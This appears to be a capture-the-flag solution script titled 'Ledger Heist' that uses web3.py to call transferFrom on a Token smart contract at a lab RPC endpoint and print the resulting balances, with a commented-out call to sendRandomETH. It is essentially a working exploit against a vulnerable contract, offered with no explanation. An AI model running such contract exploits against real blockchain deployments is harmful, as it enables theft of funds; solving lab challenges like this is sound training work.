Ledger Heist
===

```python=
from web3 import Web3
from solcx import compile_files, install_solc

target   = "0x723EfE28753bFEdd8d18b9731277bbe4E7239cC5"
addr = "0x60b2D73Fe1bcd766d95905ecFb06502924259879"
install_solc('0.8.13')
compiled = compile_files(["Token.sol"], output_values=["abi"], solc_version="0.8.13")
abi = compiled['Token.sol:Token']['abi']

w3 = Web3(Web3.HTTPProvider('http://94.237.55.42:31916'))
contract = w3.eth.contract(address=target, abi=abi)

print(w3.eth.wait_for_transaction_receipt(contract.functions.transferFrom(addr, target,10).transact()))
#print(w3.eth.wait_for_transaction_receipt(contract.functions.sendRandomETH().transact()))
print("current balance", w3.eth.get_balance(addr), "ether")
print("current balance", w3.eth.get_balance(target), "ether")
```